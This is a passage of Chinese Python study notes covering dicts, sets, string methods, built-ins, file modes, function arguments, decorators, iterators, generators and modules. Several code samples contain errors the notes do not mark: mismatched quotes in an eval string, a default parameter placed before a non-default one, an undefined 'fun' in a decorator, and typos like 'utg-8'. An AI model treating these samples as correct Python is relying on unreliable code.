reversed_dict = {value: key for key, value in my_dict.items()}
print(reversed_dict)  # 输出：{1: 'apple', 2: 'banana', 3: 'orange'}

排序字典
# 按键排序
my_dict = {'apple': 1, 'banana': 2, 'orange': 3}
sorted_dict = {key: my_dict[key] for key in sorted(my_dict)}
print(sorted_dict)  # 输出：{'apple': 1, 'banana': 2, 'orange': 3}

# 按值排序
my_dict = {'apple': 1, 'banana': 2, 'orange': 3}
sorted_dict = {key: value for key, value in sorted(my_dict.items(), key=lambda item: item[1])}
print(sorted_dict)  # 输出：{'apple': 1, 'banana': 2, 'orange': 3}

过滤字典
# 过滤字典中满足条件的键值对
my_dict = {'apple': 1, 'banana': 2, 'orange': 3}
filtered_dict = {key: value for key, value in my_dict.items() if value > 1}
print(filtered_dict)  # 输出：{'banana': 2, 'orange': 3}

计数器
# 使用collections模块中的Counter类创建计数器
from collections import Counter
my_list = ['apple', 'banana', 'apple', 'orange', 'banana', 'apple']
my_counter = Counter(my_list)
print(my_counter)  # 输出：Counter({'apple': 3, 'banana': 2, 'orange': 1})

# 获取计数器中指定元素的数量
count = my_counter['apple']
print(count)  # 输出：3

# 获取计数器中出现次数最多的元素和出现次数
most_common = my_counter.most_common(1)
print(most_common)  # 输出：[('apple', 3)]

```

### 4.11 集合

```python
以下是Python set对象支持的一些常用方法：

add(): 将一个元素添加到set中，如果元素已经存在，什么都不会发生。
fruits = {'apple', 'banana', 'orange'}
fruits.add('kiwi')
print(fruits) # {'orange', 'banana', 'kiwi', 'apple'}

clear(): 移除set中的所有元素。
fruits = {'apple', 'banana', 'orange'}
fruits.clear()
print(fruits) # set()

copy(): 返回set的一个副本。
fruits = {'apple', 'banana', 'orange'}
fruits_copy = fruits.copy()
print(fruits_copy) # {'orange', 'banana', 'apple'}

difference(): 返回一个包含set和另一个set或iterable中不同元素的新set。也可以直接减 eg:fruits - more_fruits
fruits = {'apple', 'banana', 'orange'}
more_fruits = {'banana', 'kiwi', 'pineapple'}
diff_fruits = fruits.difference(more_fruits)
print(diff_fruits) # {'orange', 'apple'}

discard(): 从set中移除一个元素，如果元素不存在，什么都不会发生。
fruits = {'apple', 'banana', 'orange'}
fruits.discard('banana')
print(fruits) # {'orange', 'apple'}

intersection(): 返回一个包含set和另一个set或iterable中共同元素的新set。也可以直接交 eg:fruits & more_fruits
fruits = {'apple', 'banana', 'orange'}
more_fruits = {'banana', 'kiwi', 'pineapple'}
common_fruits = fruits.intersection(more_fruits)
print(common_fruits) # {'banana'}

isdisjoint(): 如果set和另一个set或iterable没有共同元素，返回True，否则返回False。也可以直接交然后判断 eg:return fruits & more_fruits == set()
fruits = {'apple', 'banana', 'orange'}
more_fruits = {'kiwi', 'pineapple'}
print(fruits.isdisjoint(more_fruits)) # True

issubset(): 如果set是另一个set的子集，返回True，否则返回False。
也可以直接交然后判断是不是等于自身 eg:return fruits & more_fruits == fruits
fruits = {'apple', 'banana', 'orange'}
more_fruits = {'banana', 'orange', 'kiwi', 'pineapple'}
print(fruits.issubset(more_fruits)) # False

issuperset(): 如果set是另一个set的超集，返回True，否则返回False。
fruits = {'apple', 'banana', 'orange'}
more_fruits = {'banana', 'orange'}
print(fruits.issuperset(more_fruits)) # True

pop(): 移除并返回set中的一个元素，如果set为空，抛出KeyError异常。
fruits = {'apple', 'banana', 'orange'}
print(fruits.pop()) # 'orange'
print(fruits) # {'apple', 'banana'}

remove(): 从set中移除一个元素，如果元素不存在，抛出KeyError异常。
fruits = {'apple', 'banana', 'orange'}
fruits.remove('banana')
print(fruits) # {'orange', 'apple'}

symmetric_difference(): 返回一个包含set和另一个set或iterable中不重复元素的新set

symmetric_difference_update(): 将set和另一个set或iterable中不重复的元素更新到set中。
fruits = {'apple', 'banana', 'orange'}
more_fruits = {'banana', 'kiwi', 'pineapple'}
fruits.symmetric_difference_update(more_fruits)
print(fruits) # {'orange', 'kiwi', 'pineapple', 'apple'}

union(): 返回一个包含set和另一个set或iterable中所有元素的新set。
不可以+，除了 union() 方法，我们还可以使用 | 运算符来实现两个 set 的并集
fruits = {'apple', 'banana', 'orange'}
more_fruits = {'banana', 'kiwi', 'pineapple'}
all_fruits = fruits.union(more_fruits)
print(all_fruits) # {'kiwi', 'apple', 'pineapple', 'orange', 'banana'}

update(): 将set和另一个set或iterable中所有元素更新到set中。
fruits = {'apple', 'banana', 'orange'}
more_fruits = {'banana', 'kiwi', 'pineapple'}
fruits.update(more_fruits)
print(fruits) # {'kiwi', 'apple', 'pineapple', 'orange', 'banana'}

difference_update(): 将set和另一个set或iterable中不同的元素更新到set中。
fruits = {'apple', 'banana', 'orange'}
more_fruits = {'banana', 'kiwi', 'pineapple'}
fruits.difference_update(more_fruits)
print(fruits) # {'orange', 'apple'}

intersection_update(): 将set和另一个set或iterable中共同的元素更新到set中。
fruits = {'apple', 'banana', 'orange'}
more_fruits = {'banana', 'kiwi', 'pineapple'}
fruits.intersection_update(more_fruits)
print(fruits) # {'banana'}


```

### 4.12 字符串处理函数

```Python
大小写处理
s,s1 = "aaaBBBccc", "123456"
s.upper() # 将字符串全部大写 AAABBBCCC
s.lower() # 将字符串全部小写 aaabbbccc
s.swapcase() # 将s大小写反转 AAAbbbCCC

字符判断
isdigit() , isnumeric # 判断字符串中是否全是数字字符
print(list(map(lambda x:x.isdigit(),[Z,Z2]))) # [False, True]
isdigit：是否为数字字符，包括Unicode数字，单字节数字，双字节全角数字，不包括汉字数字，罗马数字、小数
isnumeric：是否所有字符均为数值字符，包括Unicode数字、双字节全角数字、罗马数字、汉字数字，不包括小数。

s.isalpha() # 判断字符串中是否全为字母
s.isalnum() # 判断字符串中是否全为字母或者数字

```

### 4.13 callable()

```python
## 判断一个对象能不能调用
def func():
    pass

class Foo:
    pass
print(callable(Foo))  ## true
print(callable(func)) ## true
```

### 4.14  dir()----查看属性

```python
class Foo:
    pass
obj = Foo()

print(dir(obj)) ## 查看obj的属性
'''
['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__']
'''
```

### 4.15 enumerate()

```python
## 既能拿到索引，又能拿到值
lis = ['a','b','c','d','f']

for i,v in enumerate(lis):
	print(i,v)
# 0 a
# 1 b
# 2 c
# 3 d
# 4 f

```

### 4.16 eval()

```python
## 执行字符串里的表达式
res = eval('1 + 2')

res = eval('{'name':'aini','age':22}')
print(res) 
## {'name':'aini','age':22}
## 拿到的就是字典类型
```

### 4.17 frozenset()

```python
s = frozenset({1,2,3,4,5,6})  ## 得到不可变集合
```

### 4.18 hash()

```python
## 传入不可变类型，得到一个hash值
res = hash('aini')
print(res) ## -3947223962220906649
```

### 4.19 help()

```python
## 查看文档注释
```

### 4.20 isinstance()

```python
## 判断一个对象是不是一个类的实例

class Foo:
    pass

obj = Foo()

## 判断obj是不是Foo的实例化
isinstance(obj,Foo)

## 判断列表，字典都可以用
isinstance([],list)
isinstance({{'name':'aini','age':22}},dict)
```

# 四，Python进阶知识

## 1，编码相关

1.1 指定默认的读文件的解码格式保证不乱码

```Python
这不是注释，第一行是固定格式 #coding:用什么编码格式读文件
# coding:utg-8 (如果写代码时指定则就是用什么方式编码，如果读文件时指定，则以什么格式解码)
# 代码内容

#Python3里的str类型默认直接存成Unicode所以不存在乱码
#·若要保证Python2的str类型也不乱码
x = u"艾尼你好"  # 前面加上u,意思就是Unicode编码
```

注：Python3默认用utf-8解码； Python2用ASCII码解码

## 2， 读写文件

### 2.1 控制文件读写内容的模式：t和b

```Python
# 强调：读写不能单独使用，必须跟r/w/a连用

open()方法，with 语法
1，t模式(默认的模式) 
	# 读写都以str（Unicode）为单位
    # 必须指定encoding="utf-8"
    # 必须是文本文件才可以指定编码
2，b模式
	# 是对字节进行操作
    # 不用指定编码
    
#文件操作基本流程
1，打开文件
	# window系统路径分割问题
    # 解决方案一：推荐
		f = open(r'C:\a\b\c\aini.txt')
    # 解决方案二：open这函数已经解决好了，右斜杠也可以
    	f = open('C:/a/b/c/aini.txt)
2，操作文件
    f = open('./aini.txt',mode='r',encoding='utf-8')
    res = f.read() 
    # 指针会停在最后，所以第二次读的时候没内容，需要重新打开文件，重新读取
    # 会读取所有内容
3，关闭文件
   f.close()  #回收操作系统资源
                 

```

### 2.2 文件操作的模式

```Python
# 文件操作模式
    # r  w  a  默认都是t模式，对文本进行操作(rt,wt,at)
    # rb wb ab 对字节进行操作
    # a 是追加模式，会往文件末尾开始写，w会把源文件清空掉
    # rt+ 可读可写，文件不存在直接报错
    # wt+ 可读可写，
                 
# 指针移动
    # 指针移动的单位都是bytes字节为单位
    # 只有一种特殊情况
         # t模式下的read(n),n代表的是字符个数
    with open('./aini.txt',mode='rt',encoding='utf-8') as f:
	f.read(4)  # 四个字符
     
     ### 注意： 只有0模式在t模式下使用
     f.seek(n,模式)   # n值得是指针移动的字节个数，n可以是负数，可以倒着移动
                 # 模式  
                 	# 0 参照的是文件开头位置
                 	# 1 参照的是当前指针的所造位置
                 	# 2 参照物是文件末尾
    f.tell  ## 获取指针当前位置
```

## 3，函数参数详解

### 3.1 位置参数--------关键字参数---------混合使用

```Python
1，位置实参:在函数调用阶段， 按照从左到有的顺序依次传入的值
# 特点：按照顺序与形参一一对应

2 关键字参数
# 关键字实参：在函数调用阶段，按照key=value的形式传入的值
# 特点：指名道姓给某个形参传值，可以完全不参照顺序
def func(x,y):
	print(x,y)

func(y=2,x=1) # 关键字参数
func(1,2)  # 位置参数

3，混合使用，强调
    # 1、位置实参必须放在关键字实参前
        def func(x,y):
            print(x,y)
        func(1,y=2)
        func(y=2,1)

    # 2、不能能为同一个形参重复传值
        def func(x,y):
            print(x,y)
        func(1,y=2,x=3)
        func(1,2,x=3,y=4)
```

### 3.2  默认参数------位置参数与默认参数混用

```Python
4，默认参数
    # 默认形参：在定义函数阶段，就已经被赋值的形参，称之为默认参数
    # 特点：在定义阶段就已经被赋值，意味着在调用阶段可以不用为其赋值
        def func(x,y=3):
            print(x,y)

        func(x=1)
        func(x=1,y=44444)


        def register(name,age,gender='男'):
             print(name,age,gender)

        register('三炮',18)
        register('二炮',19)	
        register('大炮',19)
        register('没炮',19,'女')


5，位置形参与默认形参混用，强调：
    # 1、位置形参必须在默认形参的左边
          def func(y=2,x):  # 错误写法
                pass

    # 2、默认参数的值是在函数定义阶段被赋值的，准确地说被赋予的是值的内存地址
    # 示范1：
        m=2
        def func(x,y=m): # y=>2的内存地址
            print(x,y）
        m=3333333333333333333
        func(1)

    # 3、虽然默认值可以被指定为任意数据类型，但是不推荐使用可变类型
    # 函数最理想的状态：函数的调用只跟函数本身有关系，不外界代码的影响
        m = [111111, ]

        def func(x, y=m):
        print(x, y)

        m.append(3333333)
        m.append(444444)
        m.append(5555)

        func(1)
        func(2)
        func(3)

       def func(x,y,z,l=None):
           if l is None:
               l=[]
               l.append(x)
               l.append(y)
               l.append(z)
            print(l)

       func(1,2,3)
       func(4,5,6)

       new_l=[111,222]
       func(1,2,3,new_l)
```

### 3.3 可变长度的参数

```Python
6，可变长度的参数（*与**的用法）
    # 可变长度指的是在调用函数时，传入的值（实参）的个数不固定
    # 而实参是用来为形参赋值的，所以对应着，针对溢出的实参必须有对应的形参来接收

6.1 可变长度的位置参数
    # I：*形参名：用来接收溢出的位置实参，溢出的位置实参会被*保存成元组的格式然后赋值紧跟其后的形参名
        # *后跟的可以是任意名字，但是约定俗成应该是args

        def func(x,y,*z): # z =（3,4,5,6）
            print(x,y,z)

        func(1,2,3,4,5,6)

        def my_sum(*args):
               res=0
               for item in args:
                    res+=item
                return res

            res=my_sum(1,2,3,4,)
            print(res)

    # II: *可以用在实参中，实参中带*，先*后的值打散成位置实参
        def func(x,y,z):
            print(x,y,z)
   
        func(*[11,22,33]) # func(11，22，33)
        func(*[11,22]) # func(11，22)
       
        l=[11,22,33]
        func(*l)

    # III: 形参与实参中都带*
        def func(x,y,*args): # args=(3,4,5,6)
            print(x,y,args)

        func(1,2,[3,4,5,6])
        func(1,2,*[3,4,5,6]) # func(1,2,3,4,5,6)
        func(*'hello') # func('h','e','l','l','o')


6.2 可变长度的关键字参数
    # I：**形参名：用来接收溢出的关键字实参，**会将溢出的关键字实参保存成字典格式，然后赋值给紧跟其后的形参名
        # **后跟的可以是任意名字，但是约定俗成应该是kwargs
        def func(x,y,**kwargs):
            print(x,y,kwargs)
       
        func(1,y=2,a=1,b=2,c=3)

    # II: **可以用在实参中(**后跟的只能是字典)，实参中带**，先**后的值打散成关键字实参
        def func(x,y,z):
            print(x,y,z)

        func(*{'x':1,'y':2,'z':3}) # func('x','y','z')
        func(**{'x':1,'y':2,'z':3}) # func(x=1,y=2,z=3)

    # 错误
        func(**{'x':1,'y':2,}) # func(x=1,y=2)
        func(**{'x':1,'a':2,'z':3}) # func(x=1,a=2,z=3)


    # III: 形参与实参中都带**
        def func(x,y,**kwargs):
           print(x,y,kwargs)

        func(y=222,x=111,a=333,b=444)
        func(**{'y':222,'x':111,'a':333,'b':4444})

    # 混用*与**：*args必须在**kwargs之前
        def func(x,*args,**kwargs):
            print(args)
            print(kwargs)
       
        func(1,2,3,4,5,6,7,8,x=1,y=2,z=3)


    def index(x,y,z):
        print('index=>>> ',x,y,z)

    def wrapper(*args,**kwargs): #args=(1,) kwargs={'z':3,'y':2}
        index(*args,**kwargs)
        # index(*(1,),**{'z':3,'y':2})
        # index(1,z=3,y=2)

    wrapper(1,z=3,y=2) # 为wrapper传递的参数是给index用的
```

### 3.4 函数的类型提示

```python
## : 后面是提示信息，可以随意写
def regidter(name:"不能写艾尼",age:"至少18岁")：
	print(name)
    print(age)
    
def register(name:str,age:int,hobbies:tuple)->int:  #  返回值类型为 int
    print(name)
    print(age)
    print(hobbies)
 
# 添加提示功能的同时，再添加默认值
def register(name:str = 'aini',age:int = 18 ,hobbies:tuple)->int:  #  返回值类型为 int
    print(name)
    print(age)
    print(hobbies)
```



## 4，装饰器

### 4.1 装饰器的一步步实现

```python
## 装饰器：装饰器定义一个函数，该函数是用来为其他函数添加额外的工能
## 装饰器就是不修改源代码以及调用方式的基础上增加新功能

## 开放封闭原则
	# 开放：指的是对拓展工能是开放的
	# 封闭： 指的是对修改源代码是封闭的
    
## 添加一个计算代码运行时间的工能（修改了源代码）    
import time
def index(name,age):
	start = time.time()
	time.sleep(3)
	print('我叫%s,今年%s岁'%(name,age))
	end = time.time()
	print(end - start)
index(age = 18,name = 'aini')

# --------------------------------------------------------------------------

def index1(name,age):
	print('我叫%s,今年%s岁' % (name, age))

def wrapper():
	start = time.time()
	index1(name="aini", age=18)
	time.sleep(3)
	end = time.time()
	print(end - start)
    
wrapper()
# 解决了修改原函数，但是也改变了函数调用方式

# --------------------------------------------------------------------------------------
def index1(name,age):
	print('我叫%s,今年%s岁' % (name, age))

def wrapper(name,age):
	start = time.time()
	index1(name, age)
	time.sleep(3)
	end = time.time()
	print(end - start)
    
wrapper('aini',18)

# -----------------------------------------------------------------------------------
def index1(name,age):
	print('我叫%s,今年%s岁' % (name, age))

def wrapper(*args,**kwargs):
	start = time.time()
	index1(*args,**kwargs)
	time.sleep(3)
	end = time.time()
	print(end - start)
    
wrapper('aini',age = 18)

# ------------------------------------------------------------------------------------
def index1(name,age):
	print('我叫%s,今年%s岁' % (name, age))
    
def outer():
    func = index
    def wrapper(*args,**kwargs):
        start = time.time()
        fun(*args,**kwargs)
        time.sleep(3)
        end = time.time()
        print(end - start)
    return wrapper
    
f = outer()  # f本质就是wrapper函数

### 继续改进
def index1(name,age):
	print('我叫%s,今年%s岁' % (name, age))
    
def outer(fun):
    def wrapper(*args,**kwargs):
        start = time.time()
        fun(*args,**kwargs)
        time.sleep(3)
        end = time.time()
        print(end - start)
    return wrapper
    
f = outer(index1)  # f本质就是wrapper函数
f(name='aini',age=22)


# 继续改进，偷梁换柱
def index1(name,age):
	print('我叫%s,今年%s岁' % (name, age))
    
def outer(fun):
    def wrapper(*args,**kwargs):
        start = time.time()
        fun(*args,**kwargs)
        time.sleep(3)
        end = time.time()
        print(end - start)
    return wrapper
    
index1 = outer(index1)  # f本质就是wrapper函数
index1(name='aini',age=22)  # 新功能加上了，也没有修改函数的调用方式

# ---------------------------------------------------------

```

### 4.2 装饰器最终版本

```Python
# 被装饰函数有返回值
########### 装饰器最终版本

def index1(name,age):
	print('我叫%s,今年%s岁' % (name, age))
    return [name,age]  # 有返回值
    
def outer(fun):
    def wrapper(*args,**kwargs):
        start = time.time()
        arg = fun(*args,**kwargs)
        time.sleep(3)
        end = time.time()
        print(end - start)
        return arg # 返回index1 的返回值
    return wrapper
    
index1 = outer(index1)  # f本质就是wrapper函数
res = index1(name='aini',age=22)  # 新功能加上了，也没有修改函数的调用方式，把原函数的返回值也拿到了
# --------------------------------------------------------------------------------------------------
```

### 4.3 装饰器语法糖

```Python
def outer(fun):
    def wrapper(*args,**kwargs):
        start = time.time()
        arg = fun(*args,**kwargs)
        time.sleep(3)
        end = time.time()
        print(end - start)
        return arg # 返回index1 的返回值
    return wrapper   
@outer
def index1(name,age):
	print('我叫%s,今年%s岁' % (name, age))
    return [name,age]  # 有返回值


# -----------------------------------------------
# 与原函数伪装的更像一点

from functools import wraps  # 用于把原函数的属性特征赋值给另一个函数
def outer(fun):
    @wraps(fun) # 可以把fun函数的所有属性特征加到wrapper函数身上
    def wrapper(*args,**kwargs):
    
        # wrapper.__name__ = fun.__name__
        # wrapper.__doc__ = fun.__doc__
        # 手动赋值麻烦
        
        start = time.time()
        arg = fun(*args,**kwargs)
        time.sleep(3)
        end = time.time()
        print(end - start)
        return arg # 返回index1 的返回值
    return wrapper

@outer
def index1(name,age):
    '''我是index1'''   # 通过help(index)函数来查看 文档信息，可以通过index.__doc__ = 'xxxxx' 来给某个函数赋值文档信息
    # 通过 index__name__ 可以获得函数的名字，也可以对其进行赋值
	print('我叫%s,今年%s岁' % (name, age))
    return [name,age]  # 有返回值
```

### 4.4  有参装饰器

#### 4.4.1 不用语法糖

```python
### 不用语法糖
def auth(func,db_type):
	def wrapper(*args,**kwargs):
		name = input('your name:').strip()
		pwd = input('your password:').strip()

		if db_type == 'file':
			print('基于文件验证')
			if name == 'aini' and pwd == 'aini123':
				print('login success')
				res = func(*args,**kwargs)
				return res
			else:
				print('用户名或者密码错误!!')

		elif db_type == 'mysql':
			print('基于mysql验证')
		elif db_type == 'ldap':
			print('基于ldap验证')
		else:
			print('基于其他途径验证')
	return wrapper


def index(x,y):
	print('index->>%s:%s'%(x,y))

index = auth(index,'file')
index('aini',22)
```

#### 4.4.2  语法糖01

```python
#---------------------------------------------------------------------
# 语法糖01
def auth(db_type = "file"):
	def deco(func):
		def wrapper(*args,**kwargs):
			name = input('your name:').strip()
			pwd = input('your password:').strip()

			if db_type == 'file':
				print('基于文件验证')
				if name == 'aini' and pwd == 'aini123':
					print('login success')
					res = func(*args,**kwargs)
					return res
				else:
					print('用户名或者密码错误!!')

			elif db_type == 'mysql':
				print('基于mysql验证')
			elif db_type == 'ldap':
				print('基于ldap验证')
			else:
				print('基于其他途径验证')
		return wrapper
	return deco

deco = auth(db_type = 'file')
@deco
def index(x,y):
	print('index->>%s:%s'%(x,y))
index('aini',22)

deco = auth(db_type = 'mysql')
@deco
def index(x,y):
	print('index->>%s:%s'%(x,y))
index('aini',22)
```

#### 4.4.3  标准语法糖

```python

# ---------------------------------------------------------------------------------
# 标准语法糖模板
def auth(外界传递的参数):
	def deco(func):
		def wrapper(*args,**kwargs):
              '''自己扩展的功能'''  
             res = func(*args,**kwargs)
             return res
         return wrapper
	return deco
@auth(外界传递的参数)
def index(x,y):
    print(x,y)
    return(x,y)


# 标准语法糖02（例子）
def auth(db_type = "file"):
	def deco(func):
		def wrapper(*args,**kwargs):
			name = input('your name:').strip()
			pwd = input('your password:').strip()

			if db_type == 'file':
				print('基于文件验证')
				if name == 'aini' and pwd == 'aini123':
					print('login success')
					res = func(*args,**kwargs)
					return res
				else:
					print('用户名或者密码错误!!')

			elif db_type == 'mysql':
				print('基于mysql验证')
			elif db_type == 'ldap':
				print('基于ldap验证')
			else:
				print('基于其他途径验证')
		return wrapper
	return deco


@auth(db_type = 'file')
def index(x,y):
	print('index->>%s:%s'%(x,y))
index('aini',22)

@auth(db_type = 'file')
def index(x,y):
	print('index->>%s:%s'%(x,y))
index('aini',22)

```

## 5， 迭代器

### 5.1 基础知识

1，迭代器：迭代取值的工具，迭代是重复的过程，每一次重复都是基于上次的结果而继续的，单纯的重复不是迭代

```python
# 可迭代对象： 但凡内置有__iter__()方法的都称之为可迭代对象
# 字符串---列表---元祖---字典---集合---文件操作  都是可迭代对象

# 调用可迭代对象下的__iter__方法将其转换为可迭代对象 
d = {'a':1, 'b':2, 'c':3}

d_iter = d.__iter__() # 把字典d转换成了可迭代对象

#   d_iter.__next__()     # 通过__next__()方法可以取值

print(d_iter.__next__()) # a
print(d_iter.__next__()) # b
print(d_iter.__next__()) # c

# 没值了以后就会报错， 抛出异常StopIteration
#-----------------------------------------------
d = {'a':1, 'b':2, 'c':3}
d_iter = d.__iter__()
while True:
	try:
		print(d_iter.__next__())
	except StopIteration:
		break
# 对同一个迭代器对象，取值取干净的情况下第二次取值的时候去不了，没值，只能造新的迭代器
```

### 5.2  迭代器与for循环工作原理

```python
#可迭代对象与迭代器详解
    #可迭代对象：内置有__iter__() 方法对象
        # 可迭代对象.__iter__(): 得到可迭代对象
        
    #迭代器对象：内置有__next__() 方法
    	# 迭代器对象.__next__()：得到迭代器的下一个值
        # 迭代器对象.__iter__(): 得到的值迭代器对象的本身（调跟没调一个样）-----------> 为了保证for循环的工作
        
# for循环工作原理
    d = {'a':1, 'b':2, 'c':3}
    d_iter = d.__iter__()

    # 1，d.__iter__() 方法得到一个跌倒器对象
    # 2,迭代器对象的__next__()方法拿到返回值，将该返回值赋值给k
    # 3,循环往复步骤2，直到抛出异常，for循环会捕捉异常并结束循坏

    for k in d:
        print(k)
        
    # 可迭代器对象不一定是迭代器对象------------迭代器对象一定是可迭代对象
    # 字符串---列表---元祖---字典---集合只是可迭代对象，不是迭代器对象、
    # 文件操作时迭代器对象也是可迭代对象
```

## 6，生成器（本质就是迭代器）

```python
# 函数里包含yield,并且调用函数以后就能得到一个可迭代对象
def test():
	print('第一次')
	yield 1
	print('第二次')
	yield 2
	print('第三次')
	yield 3
	print('第四次')

g = test()
print(g) # <generator object test at 0x0000014C809A27A0>
g_iter = g.__iter__()
res1 = g_iter.__next__() # 第一次
print(res1) # 1
res2 = g_iter.__next__() # 第二次
print(res2) # 2
res3 = g_iter.__next__() # 第三次
print(res3) # 3  

# 补充
len(s) -------> s.__len__()
next(s) ------> s.__next__()
iter(d) -------> d.__iter__()
```

### 1，yield 表达式

```Python
def person(name):
	print("%s吃东西啦！！"%name)
	while True:
		x = yield None
		print('%s吃东西啦---%s'%(name,x))


g = person('aini')
# next(g) =============== g.send(None)
next(g)
next(g)
# send()方法可以给yield传值
# 不能在第一次运行时用g.send()来传值，需要用g.send(None)或者next(g) 来初始化，第二次开始可以用g.send("值")来传值
g.send("雪糕")  # aini吃东西啦---雪糕
g.send("西瓜")  # aini吃东西啦---西瓜
```

### 2， 三元表达式

```python
x = 10
y = 20
res = x if x > y else y
# 格式
条件成立时返回的值 if 条件 else 条件不成立时返回的值
```

### 3，列表生成式

```python
l = ['aini_aaa','dilnur_aaa','donghua_aaa','egon']
res = [name for name in l if name.endswith('aaa')]
print(res)

# 语法： [结果 for 元素 in 可迭代对象 if 条件]


l = ['aini_aaa','dilnur_aaa','donghua_aaa','egon']
l = [name.upper() for name in l]
print(l)

l = ['aini_aaa','dilnur_aaa','donghua_aaa','egon']
l = [name.replace('_aaa','') for name in l if name.endswith('_aaa')]
print(l)
```

### 4，其他生成器（——没有元祖生成式——）

```python
### 字典生成器
keys = ['name','age','gender']
res = {key: None for key in keys}
print(res)  # {'name': None, 'age': None, 'gender': None}

items = [('name','aini'),('age',22),('gender','man')]
res = {k:v for k,v in items}
print(res)

## 集合生成器
keys = ['name','age','gender']
set1 = {key for key in keys}

## 没有元祖生成器
g = (i for i in range(10) if i % 4 == 0 )  ## 得到的是一个迭代器


#### 统计文件字符个数
with open('aini.txt', mode='rt', encoding= 'utf-8') as f:
    res = sum(len(line) for line in f)
    print(res)
```

### 5，二分法

```python
l = [-10,-6,-3,0,1,10,56,134,222,234,532,642,743,852,1431]

def search_num(num,list):
	mid_index = len(list) // 2
	if len(list) == 0:
		print("没找到")
		return False
	if num > list[mid_index]:
		list = list[mid_index + 1 :]
		search_num(num,list)
	elif num < list[mid_index]:
		list = list[:mid_index]
		search_num(num, list)
	else:
		print('找到了' , list[mid_index])

search_num(743,l)
```

### 6，匿名函数与lambdaj

```python
## 定义
res = lambda x,y : x+y
## 调用
(lambda x,y : x+y)(10,20)  # 第一种方法
res(10,20)    ## 第二种方法

##应用场景
salary = {
    'aini':20000,
    'aili':50000,
    'dilnur':15000,
    'hahhaha':42568,
    'fdafdaf':7854
}

res = max(salary ,key= lambda x : salary[x])
print(res)
```

## 7，模块

```python
## 内置模块
## 第三方模块
## 自定义模块

## 模块的四种形式
1， 使用Python编写的py文件
2， 已被编译为共享库或DLL的C或C++扩展
3， 把一系列模块组织到一起的文件夹（文件夹下面有个__init__.py 该文件夹称为包）
3， 使用C编写并链接到Python解释器的内置模块

import foo
## 首次导入模块会发生什么？
1，执行foo.py
2, 产生foo.py的命名空间
3，在当前文件中产生的有一个名字foo,改名字指向2中产生的命名空间

## 无论是调用还是修改与源模块为准，与调用位置无关

## 导入模块规范
1 Python内置模块
2，Python第三方模块
3，自定义模块

## 起别名

import foo as f

## 自定义模块命名应该纯小写+下划线

## 可以在函数内导入模块
```

### 7.1 写模块时测试

```python
# 每个Python文件内置了__name__,指向Python文件名

# 当foo.py 被运行时， 
__name__  =  "__main__"

# 当foo.py 被当做模块导入时，
__name__ != "__main__"

##### 测试时可以if判断,在foo.py文件中写以下判断
if __name__ == "__main__" :
    ##  你的测试代码
```

### 7.2 from xxx import xxx

```python
# from foo import x 发生什么事情
1， 产生一个模块的命名空间
2， 运行foo.py 产生，将运行过程中产生的名字都丢到命名空间去
3， 在当前命名空间拿到一个名字，改名字指向模块命名空间
```

### 7.3 从一个模块导入所有

```Python
#不太推荐使用
form foo import *  
# 被导入模块有个 __all__ = []
__all__ = []   # 存放导入模块里的所有变量和函数， 默认放所有的变量和函数，也可以手动修改


foo.py
    __all__ = ['x','change']
    x = 10
    def change():
        global x
        x = 20
    a = 20
    b = 30
    
run.py    
    from foo import *  ## * 导入的是foo.py里的 __all__ 列表里的变量和函数
    print(x)
    change()
    print(a)  # 会报错，因为foo.py 里的 __all__ 列表里没有a变量
```

### 7.4  sys.path 模块搜索路径优先级

```python
1， 内存（内置模块）
2， 从硬盘查找

import sys
# 值为一个列表，存放了一系列的文件夹
# 其中第一个文件夹是当前执行所在的文件夹
# 第二个文件夹当不存在，因为这不是解释器存放的，是pycharm添加的
print(sys.path)
# sys.path 里放的就是模块的存放路径查找顺序
[
'E:\\Desktop\\python全栈\\模块', 'E:\\Desktop\\python全栈', 'D:\\软件\\pycharm\\PyCharm 2021.3.1\\plugins\\python\\helpers\\pycharm_display', 'D:\\软件\\python\\python310.zip', 'D:\\软件\\python\\DLLs', 'D:\\软件\\python\\lib', 'D:\\软件\\python', 'C:\\Users\\艾尼-aini\\AppData\\Roaming\\Python\\Python310\\site-packages', 'D:\\软件\\python\\lib\\site-packages', 'D:\\软件\\python\\lib\\site-packages\\win32', 'D:\\软件\\python\\lib\\site-packages\\win32\\lib', 'D:\\软件\\python\\lib\\site-packages\\Pythonwin', 'D:\\软件\\pycharm\\PyCharm 2021.3.1\\plugins\\python\\helpers\\pycharm_matplotlib_backend'
]
```

### 7.5 sys.modules 查看内存中的模块

```python
import sys
print(sys.module)   # 是一个字典，存放导入的模块

## 可以判断一个模块是否已经在内存中
print('foo' in sys.module)

```

### 7.6 编写规范的模块

```python
"this module is used to ......"    # 第一行文档注释
import sys  # 导入需要用到的包
x = 1  # 定义全局变量
class foo:    # 定义类
 	pass
def test():  #定义函数
    pass

if __name__ == "__main__":
    pass
```

## 8，包（包本身就是模块）



```Python
###  包就是一个包含__init__.py的文件夹，包的本质是模块的一种形式，包用来被当做模块导入

### 导入包运行时运行__inti__.py文件里的代码
 
### 环境变量是以执行文件为准备的，所有的被导入的模块或者说后续的其他的sys.path都是参照执行文件的sys.path
```

## 9, 软件开发的目录规范

```python
ATM  --------------------------------- # 项目跟目录
	bin
    	start.py ---------------------# 启动程序
    config  ------------------------- # 项目配置文件
    	setting.py
    db ------------------------------- # 数据库相关的文件夹
    	db_handle.py
    lib ------------------------------ # 共享库（包）
    	common.py
    core ------------------------------# 核心代码逻辑
    	src.py
    api -------------------------------# API有关的文件夹
    	api.py
    log -------------------------------# 记录日志的文件夹
    	user.log
    README --------------------------- # 对软件的解释说明
    
    
    
    __file__  #  当前文件的绝对路径
    
    # 在start.py中运行 print(__file__) ---------------------- E:\Desktop\python全栈\ATM\bin\start.py
    
    import os
    import sys
    BASE_DIR = os.path.dirname(os.path.dirname(__file__))  ## 这样可以动态拿到根目录
    sys.path.append(BASE_DIR) # 把项目根目录加到环境变量了,这样可以很好的导包了
    
    
    ## 如果把运行文件 start.py 直接放在跟文件的目录下，就不需要处理环境变量了

    
    
```



## 10，反射

### 10.1 什么是反射

```python
## 反射---------------> 程序运行过程当中，动态的获取对象的信息。
```

### 10.2  如何实现反射

```python
# 通过dir:查看某一个对象可以.出来那些属性来
# 可以通过字符串反射到真正的属性上，得到熟悉值

## 四个内置函数的使用
